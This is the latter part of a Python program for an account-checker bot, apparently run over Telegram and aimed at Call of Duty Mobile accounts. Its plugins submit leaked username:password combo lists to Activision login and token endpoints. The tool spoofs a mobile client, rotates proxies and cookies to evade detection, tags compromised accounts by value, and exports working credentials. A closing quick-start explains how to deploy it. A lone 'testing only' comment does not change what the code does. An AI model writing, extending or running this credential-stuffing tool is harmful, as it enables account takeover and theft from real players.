        self._interval  = check_interval
        self._max_fail  = max_failures
        self._failures  = 0
        self._last_ok   = time.monotonic()
        self._running   = False
        self._task:     Optional[asyncio.Task] = None

    def heartbeat(self) -> None:
        self._last_ok = time.monotonic()
        self._failures = 0

    async def start(self, restart_fn: Callable) -> None:
        self._running = True
        self._task = asyncio.create_task(self._loop(restart_fn))

    async def stop(self) -> None:
        self._running = False
        if self._task:
            self._task.cancel()

    async def _loop(self, restart_fn: Callable) -> None:
        while self._running:
            await asyncio.sleep(self._interval)
            age = time.monotonic() - self._last_ok
            if age > self._interval * 2:
                self._failures += 1
                logger.warning(f"Watchdog: no heartbeat for {age:.0f}s (failures: {self._failures})")
                if self._failures >= self._max_fail:
                    logger.error("Watchdog: max failures reached — triggering restart")
                    try:
                        await restart_fn()
                    except Exception as e:
                        logger.error(f"Watchdog restart failed: {e}")
                    self._failures = 0
            else:
                self._failures = 0


# =============================================================================
#   HEALTH CHECK SERVER (optional HTTP endpoint)
# =============================================================================

async def start_health_server(port: int = 8080) -> None:
    """
    Start a minimal HTTP health check server.
    Returns 200 OK on GET /health with bot status JSON.
    """
    from aiohttp import web

    async def handle_health(request: web.Request) -> web.Response:
        data = {
            "status": "ok",
            "bot": __bot_name__,
            "version": __version__,
            "owner": f"@{__author__}",
            "uptime": time.time(),
        }
        return web.json_response(data)

    async def handle_root(request: web.Request) -> web.Response:
        return web.Response(text=f"{__bot_name__} is running")

    app = web.Application()
    app.router.add_get("/", handle_root)
    app.router.add_get("/health", handle_health)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"Health server running on port {port}")


# =============================================================================
#   PLUGIN SYSTEM (extensible checker methods)
# =============================================================================

class CheckerPlugin(ABC):
    """Base class for checker plugins."""

    @property
    @abstractmethod
    def name(self) -> str:
        ...

    @abstractmethod
    async def check(
        self, username: str, password: str, session: aiohttp.ClientSession
    ) -> Optional[AccountResult]:
        """Attempt to check an account. Return None to skip."""
        ...


class DirectActivisionPlugin(CheckerPlugin):
    """
    Direct Activision.com login via web form.
    """

    @property
    def name(self) -> str:
        return "direct_activision"

    async def check(
        self, username: str, password: str, session: aiohttp.ClientSession
    ) -> Optional[AccountResult]:
        raw = f"{username}:{password}"
        try:
            payload = {
                "username": username,
                "password": password,
                "operationName": "loginWithPassword",
            }
            async with session.post(
                ACTIVISION_LOGIN_URL,
                data=payload,
                ssl=False,
                allow_redirects=True,
            ) as resp:
                if resp.status in (200, 302):
                    body_text = await resp.text()
                    if "sso_token" in body_text.lower() or "atkn" in body_text.lower():
                        return AccountResult(
                            raw=raw, username=username, password=password,
                            status=AccountStatus.HIT,
                            detail="Login confirmed via DirectActivisionPlugin",
                        )
                    if "invalid" in body_text.lower() or "incorrect" in body_text.lower():
                        return AccountResult(
                            raw=raw, username=username, password=password,
                            status=AccountStatus.BAD,
                            detail="Invalid credentials (DirectActivisionPlugin)",
                        )
        except Exception:
            pass
        return None


class CODMobileAppPlugin(CheckerPlugin):
    """
    Simulates CODM mobile app login flow.
    """

    @property
    def name(self) -> str:
        return "codm_mobile_app"

    async def check(
        self, username: str, password: str, session: aiohttp.ClientSession
    ) -> Optional[AccountResult]:
        raw = f"{username}:{password}"
        mobile_headers = {
            **DEFAULT_HEADERS,
            "User-Agent": (
                "CODM/1.0.38 (Android 13; SM-S918B; en_US) "
                "com.activision.callofduty.shooter"
            ),
            "X-App-Version": "1.0.38",
            "X-Platform": "Android",
        }

        try:
            payload = {
                "grant_type": "password",
                "username": username,
                "password": password,
                "client_id": "cod-companion-app",
                "scope": "openid profile email",
            }
            async with session.post(
                f"{ACTIVISION_BASE_URL}/api/papi-client/stats/cod/v1/auth/token",
                json=payload,
                headers=mobile_headers,
                ssl=False,
            ) as resp:
                if resp.status == 200:
                    try:
                        body = await resp.json(content_type=None)
                        if body.get("access_token") or body.get("token"):
                            return AccountResult(
                                raw=raw, username=username, password=password,
                                status=AccountStatus.HIT,
                                detail="Login via CODM mobile app plugin",
                            )
                    except Exception:
                        pass
        except Exception:
            pass
        return None


class PluginManager:
    """Manages and runs checker plugins."""

    def __init__(self) -> None:
        self._plugins: List[CheckerPlugin] = []

    def register(self, plugin: CheckerPlugin) -> None:
        self._plugins.append(plugin)
        logger.info(f"Plugin registered: {plugin.name}")

    def all_plugins(self) -> List[CheckerPlugin]:
        return list(self._plugins)

    async def run_all(
        self, username: str, password: str, session: aiohttp.ClientSession
    ) -> Optional[AccountResult]:
        """Run all plugins in order, return first non-None result."""
        for plugin in self._plugins:
            try:
                result = await plugin.check(username, password, session)
                if result is not None:
                    return result
            except Exception as e:
                logger.debug(f"Plugin {plugin.name} error: {e}")
        return None


# =============================================================================
#   TELEMETRY & METRICS
# =============================================================================

class Metrics:
    """
    Collects runtime metrics for monitoring.
    """

    def __init__(self) -> None:
        self.checks_total     = 0
        self.checks_hit       = 0
        self.checks_bad       = 0
        self.checks_error     = 0
        self.requests_total   = 0
        self.requests_failed  = 0
        self.bytes_sent       = 0
        self.bytes_recv       = 0
        self.jobs_started     = 0
        self.jobs_finished    = 0
        self.avg_check_ms     = 0.0
        self._check_ms_buf:   deque = deque(maxlen=1000)
        self._lock            = asyncio.Lock()

    async def record_check(self, result: AccountResult) -> None:
        async with self._lock:
            self.checks_total += 1
            self._check_ms_buf.append(result.elapsed_ms)
            if self._check_ms_buf:
                self.avg_check_ms = sum(self._check_ms_buf) / len(self._check_ms_buf)

            if result.is_hit:
                self.checks_hit += 1
            elif result.is_bad:
                self.checks_bad += 1
            else:
                self.checks_error += 1

    async def record_request(self, success: bool, bytes_s: int = 0, bytes_r: int = 0) -> None:
        async with self._lock:
            self.requests_total += 1
            if not success:
                self.requests_failed += 1
            self.bytes_sent += bytes_s
            self.bytes_recv += bytes_r

    def snapshot(self) -> Dict[str, Any]:
        return {
            "checks_total":    self.checks_total,
            "checks_hit":      self.checks_hit,
            "checks_bad":      self.checks_bad,
            "checks_error":    self.checks_error,
            "hit_rate_pct":    (self.checks_hit / self.checks_total * 100) if self.checks_total else 0,
            "requests_total":  self.requests_total,
            "requests_failed": self.requests_failed,
            "avg_check_ms":    round(self.avg_check_ms, 2),
            "jobs_started":    self.jobs_started,
            "jobs_finished":   self.jobs_finished,
        }


# =============================================================================
#   DATA EXPORT
# =============================================================================

class DataExporter:
    """
    Exports data in various formats for analysis.
    """

    @staticmethod
    async def export_json(data: Any, path: str) -> str:
        """Export data as pretty JSON."""
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            await f.write(json.dumps(data, indent=2, default=str))
        return path

    @staticmethod
    async def export_csv(rows: List[Dict], path: str) -> str:
        """Export a list of dicts as CSV."""
        if not rows:
            return path
        headers = list(rows[0].keys())
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            await f.write(",".join(headers) + "\n")
            for row in rows:
                values = [_csv_safe(str(row.get(h, ""))) for h in headers]
                await f.write(",".join(values) + "\n")
        return path

    @staticmethod
    async def export_hits_txt(results: List[AccountResult], path: str) -> str:
        """Export hit results as simple username:password list."""
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            for r in results:
                await f.write(f"{r.username}:{r.password}\n")
        return path

    @staticmethod
    async def export_hits_detailed(results: List[AccountResult], path: str) -> str:
        """Export hits with all available details."""
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            await f.write("# INSTA SEE ENG — Detailed Hits Export\n")
            await f.write(f"# Generated: {utcnow_str()}\n")
            await f.write(f"# Owner: @JAYYYTTTTTTTtt\n")
            await f.write("# " + "─" * 60 + "\n")
            for i, r in enumerate(results, 1):
                await f.write(f"\n[{i}] {r.username}:{r.password}\n")
                await f.write(f"    Level    : {r.level}\n")
                await f.write(f"    Rank     : {r.rank or 'Unranked'}\n")
                await f.write(f"    CP       : {r.cp}\n")
                await f.write(f"    Skins    : {r.skins}\n")
                await f.write(f"    Clan     : {r.clan or 'None'}\n")
                await f.write(f"    Platform : {r.platform or 'Unknown'}\n")
                await f.write(f"    Region   : {r.region or 'Unknown'}\n")
                await f.write(f"    Checked  : {r.checked_at}\n")
                if r.extra:
                    await f.write(f"    Extra    : {json.dumps(r.extra)}\n")
        return path


# =============================================================================
#   SCHEDULER (cron-like task runner)
# =============================================================================

class TaskScheduler:
    """
    Simple async task scheduler for recurring maintenance tasks.
    """

    def __init__(self) -> None:
        self._tasks: List[Dict[str, Any]] = []
        self._running = False

    def schedule(
        self, fn: Callable, interval_sec: float,
        name: str = "", run_immediately: bool = False
    ) -> None:
        self._tasks.append({
            "fn":        fn,
            "interval":  interval_sec,
            "name":      name or fn.__name__,
            "last_run":  0.0 if run_immediately else time.monotonic(),
        })

    async def start(self) -> None:
        self._running = True
        asyncio.create_task(self._loop())

    async def stop(self) -> None:
        self._running = False

    async def _loop(self) -> None:
        while self._running:
            now = time.monotonic()
            for task in self._tasks:
                if now - task["last_run"] >= task["interval"]:
                    task["last_run"] = now
                    try:
                        if asyncio.iscoroutinefunction(task["fn"]):
                            await task["fn"]()
                        else:
                            task["fn"]()
                    except Exception as e:
                        logger.error(f"Scheduler task {task['name']} error: {e}")
            await asyncio.sleep(1.0)


# =============================================================================
#   COMMAND LINE INTERFACE (run from shell)
# =============================================================================

class CLIRunner:
    """
    Run the checker from command line (no Telegram, for testing).
    """

    @staticmethod
    async def run_file(path: str, output_dir: str = "results/cli") -> None:
        """Check a combo file from the CLI and save results."""
        print(f"\n{Fore.CYAN if HAS_COLORAMA else ''}{'─' * 50}")
        print(f"  Insta See Eng CLI — CODM Checker")
        print(f"  @JAYYYTTTTTTTtt")
        print(f"{'─' * 50}{Style.RESET_ALL if HAS_COLORAMA else ''}\n")

        print(f"[*] Parsing: {path}")
        accounts, invalid, raw_count = await ComboParser.parse_file(path)
        print(f"[*] Lines   : {raw_count:,}")
        print(f"[*] Valid   : {len(accounts):,}")
        print(f"[*] Invalid : {len(invalid):,}")

        if not accounts:
            print("[!] No valid accounts found. Exiting.")
            return

        proxy_mgr = ProxyManager()
        await proxy_mgr.load_from_file(PROXIES_FILE)

        checker = ExtendedCODMChecker(proxy_mgr)
        results: List[AccountResult] = []
        hits = bad = errors = 0
        start = time.monotonic()

        print(f"\n[*] Checking {len(accounts):,} accounts...\n")

        sem = asyncio.Semaphore(MAX_WORKERS)

        async def check_one(user: str, pwd: str) -> None:
            nonlocal hits, bad, errors
            async with sem:
                result = await checker.check_account(user, pwd)
                results.append(result)
                if result.is_hit:
                    hits += 1
                    print(f"  {Fore.GREEN if HAS_COLORAMA else ''}[HIT] {result.username} | Lv.{result.level} | {result.rank}{Style.RESET_ALL if HAS_COLORAMA else ''}")
                elif result.is_bad:
                    bad += 1
                else:
                    errors += 1

        tasks = [asyncio.create_task(check_one(u, p)) for u, p in accounts]
        await asyncio.gather(*tasks)

        elapsed = time.monotonic() - start
        print(f"\n{'─' * 50}")
        print(f"  Done in {AnimationEngine.format_time(elapsed)}")
        print(f"  Hits   : {hits}")
        print(f"  Bad    : {bad}")
        print(f"  Errors : {errors}")
        print(f"  Speed  : {AnimationEngine.format_speed(len(accounts) / max(elapsed, 0.1))}")
        print(f"{'─' * 50}\n")

        Path(output_dir).mkdir(parents=True, exist_ok=True)
        job = CheckJob(
            job_id=uuid.uuid4().hex,
            user_id=0,
            chat_id=0,
            msg_id=0,
            accounts=accounts,
        )
        job.results  = results
        job.hits     = hits
        job.bad      = bad
        job.errors   = errors
        job.checked  = len(results)
        job.status   = JobStatus.DONE
        job.started_at  = start
        job.finished_at = time.monotonic()

        file_paths = await ResultFileBuilder.write_results(job)
        for cat, fp in file_paths.items():
            if fp:
                print(f"  [{cat.upper()}] → {fp}")


# =============================================================================
#   SETTINGS MANAGER
# =============================================================================

class SettingsManager:
    """
    Manages per-guild / per-chat settings.
    Allows customization per Telegram group (if used in groups).
    """

    DEFAULT_SETTINGS = {
        "workers":               MAX_WORKERS,
        "timeout":               REQUEST_TIMEOUT,
        "max_accounts_free":     FREE_MAX_ACCOUNTS,
        "max_accounts_premium":  PREMIUM_MAX_ACCOUNTS,
        "cooldown_sec":          USER_COOLDOWN_SEC,
        "notify_hits_owner":     True,
        "auto_cleanup_results":  True,
        "cleanup_delay_min":     60,
        "allowed_filetypes":     ["txt"],
        "welcome_enabled":       True,
    }

    def __init__(self) -> None:
        self._settings = dict(self.DEFAULT_SETTINGS)
        self._overrides: Dict[int, Dict[str, Any]] = {}
        self._lock = asyncio.Lock()

    async def get(self, key: str, chat_id: Optional[int] = None) -> Any:
        async with self._lock:
            if chat_id and chat_id in self._overrides:
                return self._overrides[chat_id].get(key, self._settings.get(key))
            return self._settings.get(key)

    async def set_global(self, key: str, value: Any) -> None:
        async with self._lock:
            self._settings[key] = value

    async def set_chat(self, chat_id: int, key: str, value: Any) -> None:
        async with self._lock:
            if chat_id not in self._overrides:
                self._overrides[chat_id] = {}
            self._overrides[chat_id][key] = value

    async def reset_chat(self, chat_id: int) -> None:
        async with self._lock:
            self._overrides.pop(chat_id, None)

    def all_settings(self) -> Dict[str, Any]:
        return dict(self._settings)


# =============================================================================
#   COMBO STATISTICS ANALYZER
# =============================================================================

class ComboAnalyzer:
    """
    Analyzes combo lists before checking to give insights.
    """

    @staticmethod
    def analyze(accounts: List[Tuple[str, str]]) -> Dict[str, Any]:
        """Generate statistics about a combo list."""
        total = len(accounts)
        if total == 0:
            return {}

        emails    = [u for u, _ in accounts if "@" in u]
        usernames = [u for u, _ in accounts if "@" not in u]

        email_domains: Counter = Counter(
            u.split("@")[-1].lower() for u in emails if "@" in u
        )
        top_domains = dict(email_domains.most_common(10))

        pwd_lengths   = [len(p) for _, p in accounts]
        avg_pwd_len   = sum(pwd_lengths) / len(pwd_lengths) if pwd_lengths else 0
        common_pwds   = Counter(p for _, p in accounts)
        top_passwords = [p for p, _ in common_pwds.most_common(5)]

        has_upper = sum(1 for _, p in accounts if any(c.isupper() for c in p))
        has_digit = sum(1 for _, p in accounts if any(c.isdigit() for c in p))
        has_special = sum(1 for _, p in accounts if any(c in "!@#$%^&*()-_+=[]{}|;:,.<>?" for c in p))

        return {
            "total":           total,
            "emails":          len(emails),
            "usernames":       len(usernames),
            "email_pct":       len(emails) / total * 100,
            "top_domains":     top_domains,
            "avg_pwd_length":  round(avg_pwd_len, 1),
            "min_pwd_length":  min(pwd_lengths) if pwd_lengths else 0,
            "max_pwd_length":  max(pwd_lengths) if pwd_lengths else 0,
            "pwd_has_upper":   f"{has_upper/total*100:.1f}%",
            "pwd_has_digit":   f"{has_digit/total*100:.1f}%",
            "pwd_has_special": f"{has_special/total*100:.1f}%",
            "top_passwords":   top_passwords,
        }

    @staticmethod
    def quality_score(accounts: List[Tuple[str, str]]) -> float:
        """
        Estimate quality of the combo list (0.0 = trash, 1.0 = excellent).
        Based on email ratio, password complexity, domain diversity.
        """
        if not accounts:
            return 0.0

        total = len(accounts)
        analysis = ComboAnalyzer.analyze(accounts)

        # Email ratio score (0-0.3)
        email_score = min(analysis["email_pct"] / 100.0, 1.0) * 0.3

        # Password complexity score (0-0.4)
        avg_len  = analysis["avg_pwd_length"]
        len_score = min(avg_len / 12.0, 1.0) * 0.2

        upper_pct = float(analysis["pwd_has_upper"].replace("%", "")) / 100
        digit_pct = float(analysis["pwd_has_digit"].replace("%", "")) / 100
        complexity = (upper_pct * 0.5 + digit_pct * 0.5) * 0.2

        # Domain diversity (0-0.3)
        domains = len(analysis.get("top_domains", {}))
        div_score = min(domains / 5.0, 1.0) * 0.3

        return min(email_score + len_score + complexity + div_score, 1.0)


# =============================================================================
#   RESULT FORMATTER (multiple output styles)
# =============================================================================

class ResultFormatter:
    """
    Formats AccountResult objects in various styles.
    """

    @staticmethod
    def simple(result: AccountResult) -> str:
        """Just user:pass."""
        return f"{result.username}:{result.password}"

    @staticmethod
    def with_status(result: AccountResult) -> str:
        """user:pass | STATUS."""
        return f"{result.username}:{result.password} | {result.status.value}"

    @staticmethod
    def full(result: AccountResult) -> str:
        """Full hit details."""
        if not result.is_hit:
            return ResultFormatter.with_status(result)
        parts = [
            f"{result.username}:{result.password}",
            f"Lv:{result.level}",
            f"Rank:{result.rank or 'N/A'}",
            f"CP:{result.cp}",
            f"Skins:{result.skins}",
        ]
        if result.clan:
            parts.append(f"Clan:{result.clan}")
        if result.platform:
            parts.append(f"Plat:{result.platform}")
        return " | ".join(parts)

    @staticmethod
    def telegram_hit(result: AccountResult) -> str:
        """Formatted for Telegram display."""
        return (
            f"✅ `{result.username}:{result.password}`\n"
            f"   ⭐ `{result.level}` | 🏆 `{result.rank or 'Unranked'}` | "
            f"💎 `{result.cp}CP` | 🎨 `{result.skins} skins`"
        )

    @staticmethod
    def json_line(result: AccountResult) -> str:
        """JSON lines format."""
        return json.dumps(result.to_dict())

    @staticmethod
    def csv_line(result: AccountResult) -> str:
        """CSV line."""
        fields = [
            result.username, result.password, str(result.level),
            result.rank, str(result.cp), str(result.skins),
            result.clan, result.platform, result.status.value,
        ]
        return ",".join(_csv_safe(f) for f in fields)


# =============================================================================
#   ADVANCED ANIMATION FRAMES
# =============================================================================

class AdvancedAnimation:
    """
    Additional animation sequences for richer Telegram messages.
    """

    BOOT_SEQUENCE: List[str] = [
        "```\n[ INSTA SEE ENG ]\nInitializing...\n```",
        "```\n[ INSTA SEE ENG ]\nConnecting to Activision API...\n```",
        "```\n[ INSTA SEE ENG ]\nProxy pool loaded...\n```",
        "```\n[ INSTA SEE ENG ]\nReady to check accounts!\n```",
    ]

    CHECKING_FACES: List[str] = ["🤔", "🔍", "👀", "🧐", "🕵️", "🔬"]
    HIT_CELEBRATIONS: List[str] = ["🎉", "🔥", "💥", "⭐", "🏆", "👑", "💎"]
    BAD_FACES: List[str] = ["💀", "☠️", "🗑️", "❌", "🚮"]

    @staticmethod
    def scanning_animation(pct: float) -> str:
        blocks = int(pct / 10)
        bar    = "█" * blocks + "░" * (10 - blocks)
        return f"Scanning: [{bar}] {pct:.1f}%"

    @staticmethod
    def matrix_line() -> str:
        """Generate a random 'matrix'-style display line."""
        import random
        chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノ"
        return "".join(random.choice(chars) for _ in range(20))

    @staticmethod
    async def send_animated_message(
        bot: Any, chat_id: int, frames: List[str],
        delay: float = 0.5, parse_mode: str = ParseMode.MARKDOWN
    ) -> Optional[int]:
        """
        Send a message and animate it through multiple frames.
        Returns the message ID.
        """
        try:
            msg = await bot.send_message(
                chat_id=chat_id,
                text=frames[0],
                parse_mode=parse_mode,
            )
            for frame in frames[1:]:
                await asyncio.sleep(delay)
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=msg.message_id,
                        text=frame,
                        parse_mode=parse_mode,
                    )
                except Exception:
                    pass
            return msg.message_id
        except Exception:
            return None


# =============================================================================
#   FINGERPRINT / DEVICE ID
# =============================================================================

def generate_device_id() -> str:
    """Generate a realistic device ID for mobile API calls."""
    import random
    import string
    return "".join(random.choices(string.hexdigits.lower(), k=32))


def generate_uuid4() -> str:
    return str(uuid.uuid4())


def sha256_hash(text: str) -> str:
    return hashlib.sha256(text.encode()).hexdigest()


def md5_hash(text: str) -> str:
    return hashlib.md5(text.encode()).hexdigest()


# =============================================================================
#   COMBO GENERATOR (for testing)
# =============================================================================

class TestComboGenerator:
    """
    Generates test combo lists for debugging purposes.
    IMPORTANT: For testing only — not for actual credential stuffing.
    """

    @staticmethod
    def generate(count: int = 100) -> List[Tuple[str, str]]:
        """Generate fake test credentials."""
        import random
        import string

        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "test.com"]
        result  = []
        for _ in range(count):
            name    = "".join(random.choices(string.ascii_lowercase, k=random.randint(5, 12)))
            domain  = random.choice(domains)
            email   = f"{name}{random.randint(1, 999)}@{domain}"
            pwd_len = random.randint(8, 16)
            pwd     = "".join(random.choices(
                string.ascii_letters + string.digits + "!@#$", k=pwd_len
            ))
            result.append((email, pwd))
        return result

    @staticmethod
    async def write_test_file(path: str, count: int = 100) -> str:
        """Write test combos to a file."""
        combos = TestComboGenerator.generate(count)
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            for user, pwd in combos:
                await f.write(f"{user}:{pwd}\n")
        return path


# =============================================================================
#   PERSISTENT QUEUE (survive restarts)
# =============================================================================

class PersistentQueue:
    """
    A queue that can save and restore its state to disk.
    Allows pending jobs to survive bot restarts.
    """

    def __init__(self, state_file: str = "data/queue_state.json") -> None:
        self._file  = state_file
        self._items: List[Dict[str, Any]] = []
        self._lock  = asyncio.Lock()

    async def load(self) -> int:
        """Load pending items from disk. Returns count loaded."""
        try:
            async with aiofiles.open(self._file, "r") as f:
                raw = await f.read()
            self._items = json.loads(raw)
            return len(self._items)
        except (FileNotFoundError, json.JSONDecodeError):
            return 0

    async def save(self) -> None:
        async with self._lock:
            data = list(self._items)
        try:
            async with aiofiles.open(self._file, "w") as f:
                await f.write(json.dumps(data, indent=2))
        except Exception as e:
            logger.error(f"PersistentQueue save error: {e}")

    async def push(self, item: Dict[str, Any]) -> None:
        async with self._lock:
            self._items.append(item)
        await self.save()

    async def pop(self) -> Optional[Dict[str, Any]]:
        async with self._lock:
            if not self._items:
                return None
            item = self._items.pop(0)
        await self.save()
        return item

    async def clear(self) -> int:
        async with self._lock:
            count = len(self._items)
            self._items = []
        await self.save()
        return count

    def size(self) -> int:
        return len(self._items)


# =============================================================================
#   INTERNATIONALIZATION (i18n) — Basic
# =============================================================================

TRANSLATIONS: Dict[str, Dict[str, str]] = {
    "en": {
        "welcome":       "Welcome to Insta See Eng!",
        "hit_found":     "Hit found!",
        "job_complete":  "Job complete!",
        "no_job":        "No active job.",
        "job_queued":    "Job queued!",
        "job_cancelled": "Job cancelled.",
        "job_paused":    "Job paused.",
        "job_resumed":   "Job resumed.",
        "banned":        "You are banned.",
        "cooldown":      "Please wait before uploading again.",
        "invalid_file":  "No valid accounts found in file.",
    },
    "ar": {
        "welcome":       "مرحباً في Insta See Eng!",
        "hit_found":     "تم العثور على حساب صالح!",
        "job_complete":  "اكتملت المهمة!",
        "no_job":        "لا توجد مهمة نشطة.",
        "job_queued":    "تمت إضافة المهمة إلى قائمة الانتظار!",
        "job_cancelled": "تم إلغاء المهمة.",
        "job_paused":    "تم إيقاف المهمة مؤقتاً.",
        "job_resumed":   "تمت استئناف المهمة.",
        "banned":        "أنت محظور.",
        "cooldown":      "يرجى الانتظار قبل الرفع مرة أخرى.",
        "invalid_file":  "لم يتم العثور على حسابات صالحة في الملف.",
    },
    "ru": {
        "welcome":       "Добро пожаловать в Insta See Eng!",
        "hit_found":     "Найден действительный аккаунт!",
        "job_complete":  "Задание выполнено!",
        "no_job":        "Нет активного задания.",
        "job_queued":    "Задание добавлено в очередь!",
        "job_cancelled": "Задание отменено.",
        "job_paused":    "Задание приостановлено.",
        "job_resumed":   "Задание возобновлено.",
        "banned":        "Вы заблокированы.",
        "cooldown":      "Пожалуйста, подождите перед загрузкой.",
        "invalid_file":  "В файле нет допустимых аккаунтов.",
    },
}


def t(key: str, lang: str = "en") -> str:
    """Translate a key to the given language."""
    return TRANSLATIONS.get(lang, TRANSLATIONS["en"]).get(
        key, TRANSLATIONS["en"].get(key, key)
    )


# =============================================================================
#   ACCOUNT TAGGER (classify hits)
# =============================================================================

class AccountTagger:
    """
    Tags hit accounts with labels based on their properties.
    Helps users quickly identify high-value accounts.
    """

    TAGS = {
        "whale":       "💸",   # CP >= 10000
        "maxed":       "💯",   # Level >= 150
        "veteran":     "🎖️",  # Level >= 100
        "ranked":      "🏆",  # Has a real rank
        "clanmember":  "👥",  # In a clan
        "high_value":  "💎",  # Any premium indicator
        "fresh":       "🆕",  # Low level / new account
    }

    @classmethod
    def tag(cls, result: AccountResult) -> List[str]:
        """Return list of tags for a result."""
        tags: List[str] = []

        if result.cp >= 10000:
            tags.append("whale")
        if result.level >= 150:
            tags.append("maxed")
        elif result.level >= 100:
            tags.append("veteran")
        if result.rank and result.rank not in ("Unranked", "Rookie I", "Unknown"):
            tags.append("ranked")
        if result.clan:
            tags.append("clanmember")
        if result.level < 20:
            tags.append("fresh")
        if result.cp >= 1000 or result.skins >= 20 or result.level >= 100:
            tags.append("high_value")

        return tags

    @classmethod
    def format_tags(cls, tags: List[str]) -> str:
        return " ".join(cls.TAGS.get(t, t) for t in tags)

    @classmethod
    def is_high_value(cls, result: AccountResult) -> bool:
        return "high_value" in cls.tag(result)

    @classmethod
    def filter_high_value(cls, results: List[AccountResult]) -> List[AccountResult]:
        return [r for r in results if cls.is_high_value(r)]


# =============================================================================
#   COOKIE MANAGER
# =============================================================================

class CookieManager:
    """
    Manages cookie jars for Activision sessions.
    Rotates cookies to avoid detection.
    """

    def __init__(self) -> None:
        self._jars: List[aiohttp.CookieJar] = []
        self._index = 0
        self._lock  = asyncio.Lock()

    def create_jar(self) -> aiohttp.CookieJar:
        jar = aiohttp.CookieJar(unsafe=True)
        self._jars.append(jar)
        return jar

    async def get_jar(self) -> aiohttp.CookieJar:
        async with self._lock:
            if not self._jars:
                return self.create_jar()
            jar = self._jars[self._index % len(self._jars)]
            self._index += 1
            return jar

    def reset_all(self) -> None:
        for jar in self._jars:
            jar.clear()

    def count(self) -> int:
        return len(self._jars)


# =============================================================================
#   ENTRY POINT
# =============================================================================

async def main_async() -> None:
    """
    Main async entry point.
    Validates config, then starts the bot.
    """
    warnings = validate_config()
    if warnings:
        print(f"\n{Fore.YELLOW if HAS_COLORAMA else ''}[!] CONFIGURATION WARNINGS:{Style.RESET_ALL if HAS_COLORAMA else ''}")
        for w in warnings:
            print(f"  • {w}")
        print()

    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print(f"{Fore.RED if HAS_COLORAMA else ''}[!] BOT_TOKEN is not set.{Style.RESET_ALL if HAS_COLORAMA else ''}")
        print("    Edit this file and set BOT_TOKEN to your @BotFather token.")
        print("    OR set the environment variable: BOT_TOKEN=your_token_here")
        sys.exit(1)

    bot = InstaSeeEngBot()
    await bot.start()


def main() -> None:
    """
    Synchronous entry point.
    Handles asyncio event loop creation and clean shutdown.
    """
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW if HAS_COLORAMA else ''}[*] Interrupted — shutting down...{Style.RESET_ALL if HAS_COLORAMA else ''}")
    except InvalidToken:
        print(f"{Fore.RED if HAS_COLORAMA else ''}[!] Invalid bot token. Check BOT_TOKEN.{Style.RESET_ALL if HAS_COLORAMA else ''}")
        sys.exit(1)
    except Exception as e:
        logger.critical(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)


# =============================================================================
#   CLI ARGUMENT PARSING
# =============================================================================

def parse_args() -> Any:
    """Parse command line arguments."""
    import argparse

    parser = argparse.ArgumentParser(
        description=f"{__bot_name__} — CODM Account Checker Bot",
        epilog=f"Owner: @{__author__} | Version: {__version__}",
    )
    parser.add_argument(
        "--token", "-t",
        default=BOT_TOKEN,
        help="Telegram bot token (overrides BOT_TOKEN env/config)",
    )
    parser.add_argument(
        "--workers", "-w",
        type=int, default=MAX_WORKERS,
        help=f"Number of concurrent workers (default: {MAX_WORKERS})",
    )
    parser.add_argument(
        "--proxies", "-p",
        default=PROXIES_FILE,
        help=f"Path to proxies file (default: {PROXIES_FILE})",
    )
    parser.add_argument(
        "--check-file", "-f",
        default=None,
        help="Run checker on a file directly (no Telegram)",
    )
    parser.add_argument(
        "--output", "-o",
        default="results/cli",
        help="Output directory for CLI mode",
    )
    parser.add_argument(
        "--version", "-v",
        action="version",
        version=f"{__bot_name__} v{__version__} by @{__author__}",
    )
    parser.add_argument(
        "--health-port",
        type=int, default=0,
        help="Start health check HTTP server on this port (0 = disabled)",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Enable debug logging",
    )
    return parser.parse_args()


# =============================================================================
#   STARTUP HOOKS
# =============================================================================

async def run_with_args(args: Any) -> None:
    """Run with parsed CLI arguments."""
    global BOT_TOKEN, MAX_WORKERS, PROXIES_FILE

    if args.token and args.token != "YOUR_BOT_TOKEN_HERE":
        BOT_TOKEN = args.token

    if args.workers:
        MAX_WORKERS = args.workers

    if args.proxies:
        PROXIES_FILE = args.proxies

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.health_port:
        asyncio.create_task(start_health_server(args.health_port))

    if args.check_file:
        # CLI mode: just check a file
        print(f"[*] CLI mode — checking file: {args.check_file}")
        await CLIRunner.run_file(args.check_file, args.output)
        return

    # Normal bot mode
    warnings = validate_config()
    for w in warnings:
        print(f"  ⚠️  {w}")

    bot = InstaSeeEngBot()
    await bot.start()


# =============================================================================
#   FINAL MAIN
# =============================================================================

if __name__ == "__main__":
    args = parse_args()
    try:
        asyncio.run(run_with_args(args))
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
    except InvalidToken:
        print("[!] Invalid bot token.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Fatal: {e}")
        traceback.print_exc()
        sys.exit(1)


# =============================================================================
# END OF FILE
# =============================================================================
#
#   Insta See Eng — CODM Account Checker Bot
#   Owner: @JAYYYTTTTTTTtt
#   Version: 2.0.0
#
#   This file is the complete, single-file implementation.
#   No external config files needed — everything is here.
#
#   Quick Start:
#   1. pip install python-telegram-bot==20.7 aiohttp aiofiles colorama
#   2. Set BOT_TOKEN at the top (or pass --token)
#   3. Set OWNER_ID to your Telegram numeric user ID
#   4. Optional: add proxies to proxies.txt (one per line)
#   5. python3 codm_checker_bot.py
#
#   Proxy formats accepted in proxies.txt:
#   • host:port
#   • user:pass@host:port
#   • http://host:port
#   • socks5://user:pass@host:port
#
# =============================================================================


# =============================================================================
#   EXTENDED FEATURES — PART 2
#   Additional modules, utilities, and documentation
# =============================================================================

# =============================================================================
